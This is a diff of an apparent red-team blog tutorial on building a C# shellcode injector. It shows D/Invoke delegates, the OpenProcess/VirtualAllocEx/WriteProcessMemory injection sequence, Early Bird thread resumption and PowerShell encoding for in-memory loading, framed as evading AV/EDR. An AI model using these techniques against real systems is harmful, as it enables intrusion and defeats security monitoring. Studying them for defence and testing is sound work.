@@ -3,7 +3,8 @@ I won&amp;rsquo;t be drilling deep into each and everything mentioned, but some 
 <p>In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let&rsquo;s improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.</p>
 <p>I won&rsquo;t be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.</p>
 <h2 id="pinvoke">P/Invoke</h2>
-<p>On a high level, <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">P/Invoke</a> - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the <code>System</code> and <code>System.Runtime.InteropServices</code> namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the <code>OpenProcess</code> Win32API:</p>
+<p>Before talking about D/Invoke, let&rsquo;s briefly talk about P/Invoke.
+On a high level, <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">P/Invoke</a> - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the <code>System</code> and <code>System.Runtime.InteropServices</code> namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the <code>OpenProcess</code> Win32API:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>Define<span style="color:#960050;background-color:#1e0010">&#39;</span> the OpenProcess API <span style="color:#66d9ef">from</span> kernel32.dll
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;, SetLastError = true, ExactSpelling = true)]</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
@@ -14,11 +15,11 @@ I won&amp;rsquo;t be drilling deep into each and everything mentioned, but some 
 </span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>)[<span style="color:#ae81ff">0</span>].Id);
 </span></span></code></pre></div><p>Okay neat, we can import and call any API we want, so what&rsquo;s the downside?</p>
 <ol>
-<li>Any API import via P/Invoke is a static reference and will be visible in the assembly&rsquo;s Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we&rsquo;re about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as: <code>VirtualAlloc</code>, <code>VirtualAllocEx</code>, <code>MoveMemory</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> will be caught immediately. It&rsquo;s like going through airport security with bag full of explosives, you want to get caught at this point.</li>
-<li>API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more &ldquo;obvious&rdquo; APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but it won&rsquo;t be covered in this post.</li>
+<li>Any API import via P/Invoke is a static reference and will be visible in the . NET assembly&rsquo;s Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we&rsquo;re about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as <code>VirtualAlloc</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> will be caught immediately. It&rsquo;s like going through airport security with bag full of explosives, you want to get caught at this point.</li>
+<li>API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more &ldquo;obvious&rdquo; APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but we won&rsquo;t be covering it in this post.</li>
 </ol>
 <h2 id="dinvoke">D/Invoke</h2>
-<p><a href="https://github.com/TheWover/DInvoke">D/Invoke</a> - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies to dynamically invoke unmanaged APIs:</p>
+<p><a href="https://github.com/TheWover/DInvoke">D/Invoke</a> - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies the ability to dynamically invoke unmanaged APIs:</p>
 <ul>
 <li>Load a DLL into memory</li>
 <li>Get a pointer to a function/API in that DLL</li>
@@ -26,7 +27,7 @@ I won&amp;rsquo;t be drilling deep into each and everything mentioned, but some 
 This is the standard usage of D/Invoke and will avoid directly importing the APIs into our .NET Assembly&rsquo;s IAT.</li>
 </ul>
 <p>To do this, D/Invoke works with <a href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/">Delegates</a>. I&rsquo;m probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, <code>Delegates</code> allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the <code>VirtualAllocEx</code> Win32API:</p>
-<p>Creating Delegate for <code>VirtualAllocEx</code>:</p>
+<p>Make a new class and create a Delegate for <code>VirtualAllocEx</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span> {
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
 </span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
@@ -44,7 +45,7 @@ This is the standard usage of D/Invoke and will avoid directly importing the API
 <h2 id="project-injection-101">Project Injection 101</h2>
 <p>Project Injection is a commonly used technique to inject our shellcode into legitimate target process&rsquo;s virtual memory space. A textbook way to perform project injection is:</p>
 <ol>
-<li>Find a target process to inject our shellcode into.</li>
+<li>Find a target process to inject our shellcode into and get a handle to it with <code>OpenProcess</code></li>
 <li>Allocate a new memory region in the remote target process using <code>VirtualAllocEx</code></li>
 <li>Write our shellcode into the allocated remote memory region using <code>WriteProcessMemory</code></li>
 <li>Execute our shellcode as a new thread with <code>CreateRemoteThread</code></li>
@@ -188,7 +189,7 @@ To download the shellcode from a remote server, we need the <code>System.Net.Htt
 </span></span><span style="display:flex;"><span>DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.ResumeThread)) <span style="color:#66d9ef">as</span> DELEGATES.ResumeThread;
 </span></span><span style="display:flex;"><span>resThrd(procInfo.hThread);
 </span></span></code></pre></div><p>Build our .NET assembly as a x64 executable.
-For the sake of the demo, we can cheat a bit. In order to load our assembly in the target&rsquo;s memory, let&rsquo;s gzip compress and then base64 encode the assembly&rsquo;s byte stream, output it to <code>compressedEncodedBytes.txt</code>.</p>
+To load our assembly in the target&rsquo;s memory, let&rsquo;s gzip compress and then base64 encode the assembly&rsquo;s byte stream, output it to <code>compressedEncodedBytes.txt</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$bytes = [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes(<span style="color:#e6db74">&#34;</span>$(pwd)<span style="color:#e6db74">\injection.exe&#34;</span>)
 </span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.IO.MemoryStream</span>] $outStream = New-Object System.IO.MemoryStream
 </span></span><span style="display:flex;"><span>$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Compress)
